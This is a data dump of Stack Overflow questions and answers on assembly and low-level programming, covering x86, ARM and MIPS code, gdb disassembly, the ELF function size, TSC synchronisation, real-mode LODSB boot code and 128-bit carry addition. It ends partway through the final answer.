"how lisp implemented in assembly language?","6792","","<p>many (may be all?) programming language consist of assembly language</p>

<p>how lisp implemented in assembly language?</p>

<p>is there any good reference, manual, tutorial, or keyword for google?</p>

<p>any official rule/convention for build your own lisp implementation?</p>

<p>such as tail recursion should follow some embodiment rule or something..</p>

<p>thanks</p>
","<p>Although the other comments and posts are right, this question is overly vague and maybe a bit confused, I can't help but share some recommendations. I've collected a number of links and books on implementing Lisp as I have recently developed a bit of a fascination with language implementation. It's a deep topic, of course, but reading the stuff related to Lisp is especially compelling because you can skip a lot of the intense reading on parsing if you implement a Lisp compiler or interpreter in Lisp, and just use <code>read</code>. This allows the authors to get to the meat of compilation or interpretation quickly. These recommendations are books I've read or started or am reading, and mostly deal with Scheme, not Common Lisp, but still might be of some interest.</p>

<p>If you've got no background in language implementation, and have never had the pleasure of reading about the classic Lisp and Scheme ""metacircular evaluators"", I would recommend <a href=""http://mitpress.mit.edu/sicp/full-text/book/book.html"" rel=""noreferrer"">Structure and Interpretation of Computer Programs</a>. If you've seen Lisp-in-Lisp (or Scheme-in-Scheme...) you can skip ahead. In the last two chapters of SICP, the authors present a few different interpreters for Lisp/Scheme and a few variants, as well as a byte-code compiler and a virtual machine. It's simply a brilliant book, and free.</p>

<p>If you don't have time to read SICP, or don't want to slog through it just to get to the interpretation and compilation chapters, I would recommend <a href=""http://rads.stackoverflow.com/amzn/click/0262560992"" rel=""noreferrer"">The Little Schemer</a>. Even though it's very short and intended for newcomers to Lisp and Scheme, if you've never seen a Lisp interpreter written in Lisp, they do present one, and it's quite a delightful book, but might not be for everyone due to the cute style.</p>

<p>There's another free book on Scheme similar to SICP, called <a href=""http://www.cs.rpi.edu/academics/courses/fall00/ai/scheme/reference/schintro-v14/schintro_toc.html"" rel=""noreferrer"">An Introduction to Scheme and its Implementation</a>, which I haven't read but used as a reference for a few bits. There are sections on interpreters and compilers in there, and it seems to go a bit deeper than SICP, dealing with hairier things like parsing too. It maybe needed an editor, but it's an impressive offering nonetheless.</p>

<p>With a decent idea of how to do Lisp in Lisp, you can approach implementing Lisp in something lower level.</p>

<p><a href=""http://rads.stackoverflow.com/amzn/click/0521562473"" rel=""noreferrer"">Lisp in Small Pieces</a> is frequently recommended. I've read most of it, and can say it's definitely a great book, full of nitty gritty stuff. I'm going back over it with a fine comb, because it's easy to skim when you don't understand stuff. I also struggled with getting the code from the author's site to run; if you get it, I recommend using Gambit Scheme and running the code that relies on Meroonet with Meroon, from <a href=""http://www.math.purdue.edu/~lucier/software/Meroon/"" rel=""noreferrer"">this</a> distribution. Lisp in Small Pieces presents a number of interpreters written in Scheme as well as a byte-code compiler and a compiler-to-C.</p>

<p>Lisp in Small Pieces moves fast, and it's quite dense. If it's too much for you, perhaps start with <a href=""http://www.eopl3.com/"" rel=""noreferrer"">The Essentials of Programming Languages</a>. I've read some of it and it's quite good, but it's more interpreters. Apparently one of the older editions (1st? I'm not sure...) included a compiler. There seems to be a lot of change between the 3 editions, but the first is super cheap on Amazon, so check it out.</p>

<p>As for compilation to C, this is kind of a gross subject with lots of hairy bits. Compilation to C brings up all these weird corner issues, like how to optimize tail-calls and handle closures, first-class continuations and garbage collection, but it's pretty interesting, and a lot of ""real"" implementations of Scheme go this route. Marc Feeley's presentation on this is pretty interesting, titled <a href=""http://www.iro.umontreal.ca/~boucherd/mslug/meetings/20041020/minutes-en.html"" rel=""noreferrer"">The 90 Minute Scheme to C compiler</a>.</p>

<p>I have fewer resources on compiling all the way down to assembly, but there is a often recommended paper which introduces compilation of Scheme to x86, called <a href=""http://scheme2006.cs.uchicago.edu/11-ghuloum.pdf"" rel=""noreferrer"">An Incremental Approach to Compiler Construction.</a> It assumes little of the reader, however I found that it simply goes too fast and doesn't fill in enough details. Maybe you'll have better luck.</p>

<p>A lot of the above recommendation comes from this monster comment on Hacker News from over a year ago, from <a href=""http://news.ycombinator.com/item?id=835020"" rel=""noreferrer"">mahmud</a>. It references a number of ML resources, and compilation using continuations. I haven't gotten that far in my study, so I can't say what's good or not. But it's an incredibly valuable comment. The referenced works include Andrew Appel's ""Compiling with Continuations"" and Paul Wilson's ""Uniprocessor Garbage Collection Techniques"" paper.</p>

<p>Good luck!</p>
","5871236"
"x86_64 Assembly Command Line Arguments","6791","","<p>I'm new to assembly, and I just got familiar with the call stack, so bare with me. To get the command line arguments in x86_64 on Mac OS X, I can do the following:</p>

<pre><code>_main:
  sub   rsp, 8         ; 16 bit stack alignment
  mov   rax, 0
  mov   rdi, format
  mov   rsi, [rsp + 32]
  call  _printf
</code></pre>

<p>Where format is ""%s"". rsi gets set to argv[0].</p>

<p>So, from this, I drew out what (I think) the stack looks like initially:</p>

<pre><code> top of stack
               &lt;- rsp after alignment
return address &lt;- rsp at beginning (aligned rsp + 8)
  [something]  &lt;- rsp + 16
    argc       &lt;- rsp + 24
   argv[0]     &lt;- rsp + 32
   argv[1]     &lt;- rsp + 40
    ...            ...
bottom of stack
</code></pre>

<p>And so on. Sorry if that's hard to read. I'm wondering what [something] is. After a few tests, I find that it is usually just 0. However, occasionally, it is some (seemingly) random number.</p>

<p>EDIT: Also, could you tell me if the rest of my stack drawing is correct?</p>
","<p>You have it close.</p>

<p><code>argv</code> is an array <em>pointer</em>, not where the array is.  In <code>C</code> it is written <code>char **argv</code>, so you have to do two levels of dereferencing to get to the strings.</p>

<pre><code> top of stack
               &lt;- rsp after alignment
return address &lt;- rsp at beginning (aligned rsp + 8)
  [something]  &lt;- rsp + 16
    argc       &lt;- rsp + 24
   argv        &lt;- rsp + 32
   envp        &lt;- rsp + 40  (in most Unix-compatible systems, the environment
    ...            ...       string array, char **envp)
bottom of stack
 ...
somewhere else:
   argv[0]     &lt;- argv+0:   address of first parameter (program path or name)
   argv[1]     &lt;- argv+8:   address of second parameter (first command line argument)
   argv[2]     &lt;- argv+16:  address of third parameter (second command line argument)
    ...
   argv[argc]  &lt;-  argv+argc*8:  NULL
</code></pre>
","10005377"
"Getting an user input in ARM Assembly language","6786","","<p>I'm new to ARM Assembly language. I have a project. The problem i have is how to get an input from user in arm assembly (in QEMU emulator) ? Just tried this, but looks like it won't work :/</p>

<pre><code>#Scanf

    .text
    .global main

main:
    sub sp, sp, #4
    str lr, [sp, #0]

# Prompt For An Input
    ldr r0, =prompt
    bl  printf

#Scanf
    ldr r0, =format
    sub sp, sp, #4
    mov r1, sp
    bl  scanf
    ldr r2, [sp, #0]
    add sp, sp, #4

# Printing The Message
    mov r1, r2
    bl  printf

    ldr lr, [sp, #0]
    add sp, sp, #4
    mov pc, lr

    .data

format:
    .asciz ""Your Number Is %d \n""

prompt:
    .asciz ""Enter A Number\n""
</code></pre>
","<p>You haven't defined what <em>""it won't work""</em> means, but I'm going to assume that the number displayed by the last <code>printf</code> doesn't match what you inputted.</p>

<p>The fact that you're passing <code>""Your Number Is %d \n""</code> as the format string to <code>scanf</code> is a problem, since it contains a bunch of non-format specifier characters. To quote from <a href=""http://www.cplusplus.com/reference/cstdio/scanf/"" rel=""nofollow"">the documentation</a>:</p>

<blockquote>
  <p><strong>Non-whitespace character, except format specifier (%):</strong> Any character that is not either a whitespace character (blank, newline or tab) or part of a format specifier (which begin with a % character) causes the function to read the next character from the stream, compare it to this non-whitespace character and if it matches, it is discarded and the function continues with the next character of format. If the character does not match, the function fails, returning and leaving subsequent characters of the stream unread.</p>
</blockquote>

<p>What you should be doing is declare another string that contains only a format specifier, i.e. something like this:</p>

<pre><code>inputformat: .asciz ""%d""
</code></pre>

<p>And pass that string to <code>scanf</code> instead of <code>format</code>.</p>
","25093282"
"Understanding Base Pointer and Stack Pointers: In Context with gcc Output","6786","","<p>I have the following C program:</p>

<pre><code>int main()
{
    int c[10] = {0, 0, 0, 0, 0, 0, 0, 0, 1, 2};
    return c[0];
}
</code></pre>

<p>and when compiled using the -S directive with gcc I get the following assembly:</p>

<pre><code>    .file   ""array.c""
    .text
.globl main
    .type   main, @function
main:
.LFB0:
    .cfi_startproc
    pushq   %rbp
    .cfi_def_cfa_offset 16
    .cfi_offset 6, -16
    movq    %rsp, %rbp
    .cfi_def_cfa_register 6
    movl    $0, -48(%rbp)
    movl    $0, -44(%rbp)
    movl    $0, -40(%rbp)
    movl    $0, -36(%rbp)
    movl    $0, -32(%rbp)
    movl    $0, -28(%rbp)
    movl    $0, -24(%rbp)
    movl    $0, -20(%rbp)
    movl    $1, -16(%rbp)
    movl    $2, -12(%rbp)
    movl    -48(%rbp), %eax
    leave
    .cfi_def_cfa 7, 8
    ret
    .cfi_endproc
.LFE0:
    .size   main, .-main
    .ident  ""GCC: (GNU) 4.4.5 20110214 (Red Hat 4.4.5-6)""
    .section        .note.GNU-stack,"""",@progbits
</code></pre>

<p>What I do not understand is why are the earlier array elements further from the bp? It almost seems like the elements on the array are being placed in opposite order. </p>

<p>Also why does gcc not use push instead of movl, to push the array elements onto the stack?</p>

<hr>

<p><strong>DIFFERENT VIEW</strong></p>

<p>Moving the array to global namespace as a static variable to the module I get:</p>

<pre><code>    .file   ""array.c""
    .data
    .align 32
    .type   c, @object
    .size   c, 40
c:
    .long   0
    .long   0
    .long   0
    .long   0
    .long   0
    .long   0
    .long   0
    .long   0
    .long   1
    .long   2
    .text
.globl main
    .type   main, @function
main:
.LFB0:
    .cfi_startproc
    pushq   %rbp
    .cfi_def_cfa_offset 16
    .cfi_offset 6, -16
    movq    %rsp, %rbp
    .cfi_def_cfa_register 6
    movl    c(%rip), %eax
    leave
    .cfi_def_cfa 7, 8
    ret
    .cfi_endproc
.LFE0:
    .size   main, .-main
    .ident  ""GCC: (GNU) 4.4.5 20110214 (Red Hat 4.4.5-6)""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>Using the following C program:</p>

<pre><code>static int c[10] = {0, 0, 0, 0, 0, 0, 0, 0, 1, 2};

int main() 
{
    return c[0];
}
</code></pre>

<p>This doesn't give more insight to the stack. But it is intersting to see the differement output of assembly using slightly different semantics.</p>
","<p>First of all, the x86 stack grows downwards. By convention, <code>rbp</code> stores the original value of <code>rsp</code>. Therefore, the function's arguments reside at <em>positive</em> offsets relative to <code>rbp</code>, and its automatic variables reside at <em>negative</em> offsets. The first element of an automatic array has a lower address than all other elements, and thus is the furthest away from <code>rbp</code>.</p>

<p>Here is a handy diagram that appears <a href=""http://unixwiz.net/techtips/win32-callconv-asm.html"" rel=""noreferrer"">on this page</a>:</p>

<p><img src=""https://i.stack.imgur.com/KVQDB.gif"" alt=""stack layout""></p>

<p>I see no reason why the compiler <em>couldn't</em> use a series of <code>push</code> instructions to initialize your array. Whether this would be a good idea, I am not sure.</p>
","8478583"
"How do I view Assembly my C code in MPLAB x","6777","","<p>I have code written in C but I need to see the Assembly file so I can optimize the code and figure out how long certain functions will take. Does anyone know of a quick way to pull up the Assembly code?</p>
","<p>You basically just have to not compile it all the way through, there are flags available so that you can see your code in various states, including assembly.</p>

<p>Take a .c file and compile it with gcc -S test.c </p>

<p>EDIT: I didn't think MPLAB was important to your question until I googled it, but I guess it's safe to assume that you're running this code in the non-OS form?</p>

<p>EDIT: A few MPLAB answers <a href=""http://www.microchip.com/forums/m537589.aspx"" rel=""nofollow"">http://www.microchip.com/forums/m537589.aspx</a></p>
","24915103"
"Debugging disassembled libraries with gdb","6772","","<p>in Linux and Mac OS X I can use stepi and nexti to debug an application without debugging information. </p>

<p>On Mac OS X gdb shows the functions that are called inside the library, although sometimes advancing several assembler instructions in each stepi instruction.</p>

<p>On Linux, when I step into a dynamic library gdb gets lost. For instance, with puts() there are three assembler instructions inside puts(), once gdb reaches the jump at 0x080482bf, it fails with the message ""No function contains program counter for selected frame"".</p>

<pre><code>0x080482ba in puts@plt ()
(gdb) disassemble
Dump of assembler code for function puts@plt:
0x080482b4 &lt;puts@plt+0&gt;:        jmp    *0x8049580
0x080482ba &lt;puts@plt+6&gt;:        push   $0x10
0x080482bf &lt;puts@plt+11&gt;:       jmp    0x8048284 &lt;_init+48&gt;
End of assembler dump.
(gdb) stepi
0x080482bf in puts@plt ()
(gdb) stepi
0x08048284 in ?? ()
(gdb) disassemble
No function contains program counter for selected frame.
</code></pre>

<p>Do you know how to debug these library calls with gdb.</p>
","<p>If GDB does not have debug symbols for the function you are trying to debug, GDB will not be able to determine the range of memory addresses to disassemble. To work around this, you can pass the range into the <code>disassemble</code> command. For example:</p>

<pre><code>(gdb) p $pc
$4 = (void (*)()) 0x70c72d &lt;_IO_puts+29&gt;
(gdb) disassemble 0x70c72d 0x70c740
Dump of assembler code from 0x70c72d to 0x70c740:
0x0070c72d &lt;_IO_puts+29&gt;:   mov    %eax,(%esp)
0x0070c730 &lt;_IO_puts+32&gt;:   call   0x721f10 &lt;strlen&gt;
0x0070c735 &lt;_IO_puts+37&gt;:   mov    0x84c(%ebx),%edx
0x0070c73b &lt;_IO_puts+43&gt;:   cmpw   $0x0,(%edx)
0x0070c73f &lt;_IO_puts+47&gt;:   mov    %edx,-0x10(%ebp)
End of assembler dump.
</code></pre>

<p>There may be a way to install debug symbols. On my Ubuntu system, I installed the package <code>libc6-dbg</code>, which allows me to step into functions in the standard library.</p>
","1617409"
"Producing x86 assembly code from a binary executable/C array","6770","","<p>I have a C array that contains binary x86_64 machine code, which I need to convert to assembly code on a Linux machine. I have no problem in converting the C array to a binary executable, but can't find the utility to convert it to asm code.</p>

<p>Any ideas?</p>

<p>Thanks!</p>
","<p>You are probably looking for a <strong>disassembler</strong>. A disassembler takes machine code (either from an executable, or from an object file) and turns it back into human-readable assembly language. If that's what you need, have a look at <a href=""http://en.wikibooks.org/wiki/X86_Disassembly/Disassemblers_and_Decompilers#Linux_Disassemblers"" rel=""nofollow noreferrer"">this list of disassemblers for Linux</a>.</p>

<hr>

<p>Some disassemblers that aren't listed there:</p>

<ul>
<li><p><em>IDA Pro</em>: Apparently one of the most powerful disassemblers. Probably overkill for your purposes.</p></li>
<li><p><em>ndisasm</em> (accompanies the <em>nasm</em> assembler)</p></li>
</ul>
","2794517"
"convert int to float in MIPS assembly","6769","","<p>My method is to spill the int register and load into the float register and then convert</p>

<pre><code>li $t0, 2       
sw $t0, -88($fp)    
l.s $f4, -88($fp)
cvt.d.s $f6, $f4
</code></pre>

<p>I'm trying to translate an expression like</p>

<pre><code>float a = 3.0;
float b = a / 2;
</code></pre>

<p>But the above method doesn't give me a proper answer (print out <code>inf</code>).</p>

<p>So where have I done wrong? Any suggestions?</p>

<p>P.S.  <code>2</code> doesn't know the lhs operand is a float type so I can not load <code>2.0</code> instead </p>
","<p>You are using an incorrect suffix; <code>.d</code> will operate on a double word (64 bit). Here's what you want:</p>

<pre><code>li   $t0, 2
sw   $t0, -88($fp)
lwc1 $f4, -88($fp)
cvt.s.w $f6, $f4
</code></pre>
","10697470"
"MIPS get memory address from register","6767","","<p>Imagine that I have a function in C that has 5 parameter.</p>

<pre><code>sum(n1,n2,n3,n4,n5);
</code></pre>

<p>In assembly. I get the first four parameter from registers 4 to 7 and the last parameter is acceded like:</p>

<pre><code> lw $8, 16($29)
</code></pre>

<p><strong>First question</strong></p>

<p>If <code>lw  $8, 16($29)</code> puts n5 in register $8, why doesn't this</p>

<pre><code>lw      $9, 0($29)
lw      $10, 4($29)
lw      $11, 8($29)
lw      $12, 12($29)
</code></pre>

<p>puts n1 to n4 in registers $9 to $12?</p>

<p><strong>Second question</strong></p>

<p>Since the parameters in <code>sum(n1,n2,n3,n4,n5);</code> are somewhere stored in memory and in assembly, the first parameter is in <code>$4</code> how can I get the memory address of <code>$4</code> to <code>$7</code>?</p>

<p>If i do this:</p>

<pre><code>    .data
array:  .word 3,4,2,6,12,7,18,26,2,14,19,7,8,12,13
    .text
main:
    li  $8,1
    la  $9,array
</code></pre>

<p>the last instruction puts the address location of my array in <code>$9</code>. If I do</p>

<pre><code>main:
    li  $4,1
    la  $9,0($4)
</code></pre>

<p>The value on <code>$9</code>is still 1 and not the address of <code>$4</code></p>
","<p><strong>First question</strong></p>

<p>To answer this, you need to understand how parameter-passing is generally handled. There are <a href=""http://pages.cs.wisc.edu/~cs354-2/beyond354/conventions.html"" rel=""nofollow"">conventions</a> for parameter passing. The first four parameters are always passed through registers $4 through $7, and the <em>remaining</em> parameters are passed through the stack. There's no point in passing the first four parameters on the stack if they're already passed by registers, right? So it only pushes to the stack what's left after the first four.</p>

<p><strong>Second question</strong></p>

<p>There is a distinction between <a href=""http://en.wikipedia.org/wiki/Processor_register"" rel=""nofollow"">registers</a> and memory. <em>CPU registers aren't mapped to any memory address.</em> They are special ""pieces"" of memory that are separate from the rest of your RAM, ROM, etc. They are much faster than the memory in your RAM or ROM, and so there are MIPS instructions that operate <strong>directly on them</strong>, rather than indirectly through memory addresses.</p>

<p>Think about exactly what you're doing:</p>

<pre><code>main:
    li  $4,1
    la  $9,0($4)
</code></pre>

<p>What's the first instruction doing? It's loading a value of 1 into register 4.</p>

<p>What's the second instruction doing? It's treating the <em>value inside of</em> register 4 as a label (or an address), adding 0 to it, and storing the result in register 9. So of course register 9 will end up having a value of 1.</p>

<p>In MIPS, and in nearly all architectures, there is no concept of addressing registers. You operate <strong>directly</strong> on them.</p>

<p><strong>EDIT</strong>: I should make a distinction between <a href=""http://en.wikipedia.org/wiki/Processor_register"" rel=""nofollow"">processor registers</a> and <a href=""http://en.wikipedia.org/wiki/Hardware_register"" rel=""nofollow"">hardware registers</a>. Of course, I'm referring to the processor registers. Hardware registers (outside of the CPU) are a slightly different concept, and they explicitly <em>are</em> addressable. However, I think that's beyond the scope of what Favolas is asking.</p>
","10261912"
"CPU TSC fetch operation especially in multicore-multi-processor environment","6759","","<p>In Linux world, to get nano seconds precision timer/clockticks one can use : </p>

<pre class=""lang-cpp prettyprint-override""><code>#include &lt;sys/time.h&gt;

int foo()
{
   timespec ts;

   clock_gettime(CLOCK_REALTIME, &amp;ts); 
   //--snip--      
}
</code></pre>

<p><a href=""https://stackoverflow.com/a/275031/143897"">This answer</a> suggests an <code>asm</code> approach to directly query for the cpu clock with the <code>RDTSC</code> instruction. </p>

<p>In a multi-core, multi-processor architecture, how is this clock ticks/timer value synchronized across multiple cores/processors? My understanding is that there in inherent fencing being done. Is this understanding correct? </p>

<p>Can you suggest some documentation that would explain this in detail? I am interested in Intel Nehalem and Sandy Bridge microarchitectures.</p>

<p><strong>EDIT</strong></p>

<p>Limiting the process to a single core or cpu is not an option as the process is really huge(in terms of resources consumed) and would like to optimally utilize all the resources in the machine that includes all the cores and processors. </p>

<p><strong>Edit</strong> </p>

<p>Thanks for the confirmation that the TSC is synced across cores and processors. But my original question is how is this synchronization done ? is it with some kind of fencing ? do you know of any public documentation ? </p>

<p><strong>Conclusion</strong></p>

<p>Thanks for all the inputs: Here's the conclusion for this discussion: The TSCs are synchronized at the initialization using a RESET that happens across the cores and processors in a multi processor/multi core system. And after that every Core is on their own. The TSCs are kept invariant with a Phase Locked Loop that would normalize the frequency variations and thus the clock variations <strong>within a given Core</strong> and that is how the TSC remain in sync across cores and processors. </p>
","<p>On newer CPUs (i7 Nehalem+ IIRC) the TSC is synchronzied across all cores and runs a constant rate.
So for a single processor, or more than one processor on a single package or mainboard(!)  you can rely on a synchronzied TSC. </p>

<p>From the Intel System Manual 16.12.1</p>

<blockquote>
  <p>The time stamp counter in newer processors may support an enhancement,
  referred to as invariant TSC. Processors support for invariant TSC is
  indicated by CPUID.80000007H:EDX[8]. The invariant TSC will run at a
  constant rate in all ACPI P-, C-. and T-states. This is the
  architectural behavior moving forward.</p>
</blockquote>

<p>On older processors you can not rely on either constant rate or synchronziation.</p>

<p>Edit: At least on multiple processors in a single package or mainboard the invariant TSC is synchronized. The TSC is reset to zero at a /RESET and then ticks onward at a constant rate on each processor, without drift. The /RESET signal is guaranteed to arrive at each processor at the same time.</p>
","10922036"
"How to get the size of a C function from inside a C program or with inline assembly?","6750","","<p><strong>Suppose I have a function like below:</strong></p>

<pre><code># cat 003.c

int foo(int a, int b)
{
    return a+b;
}
</code></pre>

<p><strong>And compile it like this:</strong></p>

<pre><code>gcc -S 003.c
</code></pre>

<p><strong>The gets the following assembly result:</strong></p>

<pre><code>     .file   ""003.c""
     .text
 .globl foo
     .type   foo, @function
 foo:
 .LFB2:
     pushq   %rbp
 .LCFI0:
     movq    %rsp, %rbp
 .LCFI1:
     movl    %edi, -4(%rbp)
     movl    %esi, -8(%rbp)
     movl    -8(%rbp), %edx
     movl    -4(%rbp), %eax
     addl    %edx, %eax
     leave
     ret
 .LFE2:
     .size   foo, .-foo /* size of the function foo, how to get it?*/
</code></pre>

<p>The last line above do get the size of the function. Where does the compiler store the size? Can I get the function's size in some way in my origin C program using <b>C or inline asm</b>?</p>
","<p>The information about a function size is stored in the <em>ELF Attributes</em> for the corresponding symbol (name). C example code how to parse this programmatically is at the bottom of the Solaris manpage for<a href=""http://docs.oracle.com/cd/E19683-01/817-0679/6mgfb878e/index.html"" rel=""nofollow noreferrer""><code>gelf_getsym(3ELF)</code></a> (libelf does exist in Linux, *BSD and MacOS as well, you need to look for the <code>st_size</code> field of the <code>GElf_Sym</code> structure), but you also can use objdump / elfdump (Solaris) / readelf (Linux) for the task:</p>

<pre>$ objdump -h -d --section=.text foo3.o

foo3.o:     file format elf64-x86-64

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
  0 .text         00000012  0000000000000000  0000000000000000  00000040  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
[ ... ]
Disassembly of section .text:

0000000000000000 &lt;foo&gt;:
   0:   55                      push   %rbp
   1:   48 89 e5                mov    %rsp,%rbp
   4:   89 7d fc                mov    %edi,0xfffffffffffffffc(%rbp)
   7:   89 75 f8                mov    %esi,0xfffffffffffffff8(%rbp)
   a:   8b 45 f8                mov    0xfffffffffffffff8(%rbp),%eax
   d:   03 45 fc                add    0xfffffffffffffffc(%rbp),%eax
  10:   c9                      leaveq
  11:   c3                      retq</pre>

<p>This is for an unoptimized compile of your code, while the optimized version is:</p>

<pre>$ objdump -h -d --section=.text foo3.o

foo3.o:     file format elf64-x86-64

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
  0 .text         00000004  0000000000000000  0000000000000000  00000040  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
[ ... ]
Disassembly of section .text:

0000000000000000 &lt;foo&gt;:
   0:   8d 04 37                lea    (%rdi,%rsi,1),%eax
   3:   c3                      retq</pre>

<p>Note the ""Size"" change from <code>0x12</code> to <code>4</code> ? That's what comes from the <code>.size</code> assembler directive.</p>

<p>The ""trick"" of trying to use inline assembly to give you function sizes / code locations isn't accounting for compiler-generated glue code (function entry prologues / exit epilogues, inline code generation, ...), nor for the compiler re-ordering inline assembly (gcc is notorious to do so), hence it's not generally a great idea to trust this. In the end, it depends on what exactly you're trying to do ...</p>

<p><strong>Edit:</strong> A few more references, external as well as on stackoverflow:</p>

<ol>
<li>From the gcc mailing list, <a href=""http://gcc.gnu.org/ml/gcc-help/2003-07/msg00076.html"" rel=""nofollow noreferrer"">thread on <code>sizeof(function)</code></a></li>
<li><a href=""https://stackoverflow.com/questions/2666392/what-does-sizeof-function-name-return"">what does sizeof (function name) return?</a></li>
<li><a href=""https://stackoverflow.com/questions/10966856/find-size-of-a-function-in-c"">Find size of a function in C</a></li>
<li><a href=""http://sourceforge.net/projects/elftoolchain/files/Documentation/libelf-by-example/"" rel=""nofollow noreferrer"">LibELF by example</a> sourceforge project (this is documentation / a tutorial)</li>
</ol>
","11410807"
"What is required to use LODSB in assembly?","6733","","<p>What is the minimum set of steps required to use LODSB to load a relative address to a string in my code?</p>

<p>I have the following test program that I'm using PXE to boot. I boot it two ways: via pxelinux.0 and directly. If I boot it directly, my program prints both strings. If I boot via pxelinux.0, it only prints the first string.</p>

<p>Why?  </p>

<blockquote>
  <p><strong>Answer:</strong>  The code is fine, the initial address math is wrong. See below.</p>
</blockquote>

<p>Working technique (for both):</p>

<ul>
<li>Set the direction flag to increment, <code>cld</code>  </li>
<li>Set <code>ds</code> to <code>cs</code> </li>
<li>Put the address (from start) of string in <code>si</code></li>
<li>Add the starting offset to <code>si</code></li>
</ul>

<p>Non-working technique (just for pxelinux):</p>

<ul>
<li>Calculate a new segment address based on <code>(((cs &lt;&lt; 4) + offset) &gt;&gt; 4)</code></li>
<li>Set <code>ds</code> to that. (either A000 or 07C0)</li>
</ul>

<p><a href=""https://meta.stackexchange.com/questions/27243/bug-code-blocks-after-numbered-or-bulleted-lists-completely-disappear""><em>text here to fix bug in markdown</em></a></p>

<pre><code>// Note: If you try this code, don't forget to set 
//       the ""#if 0"" below appropriately!

    .text
    .globl  start, _start

start:  
_start: 
_start1:    

    .code16

    jmp real_start

    . = _start1 + 0x1fe
    .byte 0x55, 0xAA

    // Next sector
    . = _start1 + 0x200

    jmp real_start

test1_str:
    .asciz  ""\r\nTest: 9020:fe00""
test2_str:
    .asciz  ""\r\nTest: a000:0000""

real_start:

    cld         // Make sure %si gets incremented.

#if 0
    // When loaded by pxelinux, we're here:
    // 9020:fe00 ==&gt; a000:0000

    // This works.
    movw    $0x9020, %bx
    movw    %bx, %ds
    movw    $(test1_str - _start1), %si
    addw    $0xfe00, %si
    call    print_message

    // This does not.
    movw    $0xA000, %bx
    movw    %bx, %ds
    movw    $(test2_str - _start1), %si
    call    print_message
#else
    // If we are loaded directly without pxelinux, we're here:
    // 0000:7c00 ==&gt; 07c0:0000

    // This works.
    movw    $0x0000, %bx
    movw    %bx, %ds
    movw    $(test1_str - _start1), %si
    addw    $0x7c00, %si
    call    print_message

    // This does, too.
    movw    $0x07c0, %bx
    movw    %bx, %ds
    movw    $(test2_str - _start1), %si
    call    print_message
#endif

    // Hang the computer
    sti
1:
    jmp 1b


// Prints string DS:SI (modifies AX BX SI)
print_message:
    pushw   %ax
    jmp 2f
3:
    movb    $0x0e, %ah  /* print char in AL */
    int $0x10       /* via TTY mode */
2:  
    lodsb   (%si), %al  /* get token */
    cmpb    $0, %al     /* end of string? */
    jne 3b
    popw    %ax
    ret

.balign 0x200
</code></pre>

<p>Here's the compilation:</p>

<pre><code>/usr/bin/ccache gcc -Os -fno-stack-protector -fno-builtin -nostdinc  -DSUPPORT_SERIAL=1 -DSUPPORT_HERCULES=1 -DSUPPORT_GRAPHICS=1 -DHAVE_CONFIG_H -I. -Wall -ggdb3 -Wmissing-prototypes -Wunused -Wshadow -Wpointer-arith -falign-jumps=1 -falign-loops=1 -falign-functions=1 -Wundef -g -c -o ds_teststart_exec-ds_teststart.o ds_test.S
/usr/bin/ccache gcc  -g   -o ds_teststart.exec -nostdlib -Wl,-N -Wl,-Ttext -Wl,8000 ds_teststart_exec-ds_teststart.o  
objcopy -O binary ds_teststart.exec ds_teststart
</code></pre>
","<p><strong>First problem:</strong></p>

<p>9020:FE00 ==> 9000:0000 and not A000:0000<br>
I was using some code from grldrstart.S that does that calculation. There's a bug in the grldrstart.S routine. It takes the FE00 offset and shifts it right 4 bits, but it does it without preserving the sign; FE00 is a negative number. So instead of:  </p>

<pre><code>shrw   $4, %bx
</code></pre>

<p>it should have been</p>

<pre><code>sarw   $4, %bx   // Preserves sign!!
</code></pre>

<p>90200 + FE00 = 90200 - 200 = 90000</p>

<p><strong>Question Answer:</strong></p>

<p>In order to use LODSB, you must:</p>

<ul>
<li>set <code>ds</code> properly (and use correct math)</li>
<li>set the direction flag correctly, using <code>cld</code> or <code>std</code> for increment and decrement</li>
<li>set <code>si</code> to the offset to your source buffer.</li>
<li>the effective address read will be <code>(ds &lt;&lt; 4) + si</code></li>
</ul>
","2487561"
"Efficient 128-bit addition using carry flag","6727","","<p>I'm using a 128 bit integer counter in the very inner loops of my C++ code. (Irrelevant background: The actual application is evaluating finite difference equations on a regular grid, which involves repetitively incrementing large integers, and even 64 bits isn't enough precision because small rounding accumulates enough to affect the answers.)</p>

<p>I've represented the integer as two 64 bit unsigned longs. I now need to increment those values by a 128 bit constant. This isn't hard, but you have to manually catch the carry from the low word to the high word.</p>

<p>I have working code something like this:</p>

<pre><code>inline void increment128(unsigned long &amp;hiWord, unsigned long &amp;loWord)
  {
    const unsigned long hiAdd=0x0000062DE49B5241;
    const unsigned long loAdd=0x85DC198BCDD714BA;

    loWord += loAdd;
    if (loWord &lt; loAdd) ++hiWord; // test_and_add_carry
    hiWord += hiAdd;
  }
</code></pre>

<p>This is tight and simple code. It works.</p>

<p>Unfortunately this is about 20% of my runtime. The killer line is that loWord test. If I remove it, I obviously get the wrong answers but the runtime overhead drops from 20% to 4%! So that carry test is especially expensive!</p>

<p>My question:  Does C++ expose the hardware carry flags, even as an extension to GCC? 
It seems like the additions could be done without the test-and-add-carry  line above if the actual compiled instructions used an add using last carry instruction for the hiWord addition.
Is there a way to rewrite the test-and-add-carry line to get the compiler to use the intrinsic opcode?</p>
","<p>Actually gcc will use the carry automatically if you write your code carefully...</p>

<p>I compiled this code with <code>gcc -O2 -Wall -Werror -S</code>:</p>

<pre><code>void increment128_1(unsigned long &amp;hiWord, unsigned long &amp;loWord)
{
    const unsigned long hiAdd=0x0000062DE49B5241;
    const unsigned long loAdd=0x85DC198BCDD714BA;

    loWord += loAdd;
    if (loWord &lt; loAdd) ++hiWord; // test_and_add_carry                                                                                                             
    hiWord += hiAdd;
}

void increment128_2(unsigned long &amp;hiWord, unsigned long &amp;loWord)
{
    const unsigned long hiAdd=0x0000062DE49B5241;
    const unsigned long loAdd=0x85DC198BCDD714BA;

    loWord += loAdd;
    hiWord += hiAdd;
    hiWord += (loWord &lt; loAdd); // test_and_add_carry                                                                                                               
}
</code></pre>

<p>This is the assembly for increment128_1:</p>

<pre><code>.cfi_startproc
        movabsq     $-8801131483544218438, %rax
        addq        (%rsi), %rax
        movabsq     $-8801131483544218439, %rdx
        cmpq        %rdx, %rax
        movq        %rax, (%rsi)
        ja  .L5
